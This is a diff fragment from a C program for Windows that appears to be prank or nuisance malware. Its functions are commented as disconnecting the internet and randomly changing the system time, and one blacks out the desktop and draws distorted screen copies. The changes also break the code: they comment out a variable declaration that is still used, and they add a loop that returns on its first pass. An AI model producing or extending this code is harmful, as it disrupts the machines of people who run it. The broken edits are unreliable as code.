@@ -79,7 +79,7 @@ int p2()
 int p3()
 {
 	HWND desktop = GetDesktopWindow();
-	RECT rect;
+	//RECT rect;
 	GetWindowRect(desktop, &rect);
 	INT w = rect.right - rect.left;
 	INT h = rect.bottom - rect.top;
@@ -700,9 +700,11 @@ int p24()
 // Disconnect from the internet
 int p25() 
 {
-	InternetSetOptionA(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);
-	InternetSetOptionA(NULL, INTERNET_OPTION_REFRESH, NULL, 0);
-	return 0;
+	whiletrue {
+		InternetSetOptionA(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);
+		InternetSetOptionA(NULL, INTERNET_OPTION_REFRESH, NULL, 0);
+		return 0;
+	}
 }
 
 // Randomly change the system time
@@ -816,7 +818,7 @@ int p33()
 	fori(50) {
 		SelectObject(compatibleDC, bmp);
 		BitBlt(hDesk, 0, 0, SM_CXSCREEN, SM_CYSCREEN, hDesk, 0, 0, BLACKNESS);
-		BitBlt(compatibleDC, i, sin(i), SM_CXSCREEN, SM_CYSCREEN, hDesk, 0, 0, SRCCOPY);
+		BitBlt(hDesk, i, sin(i), SM_CXSCREEN, SM_CYSCREEN, compatibleDC, 0, 0, SRCCOPY);
 	}
 	DeleteObject(bmp);
 	DeleteDC(compatibleDC);
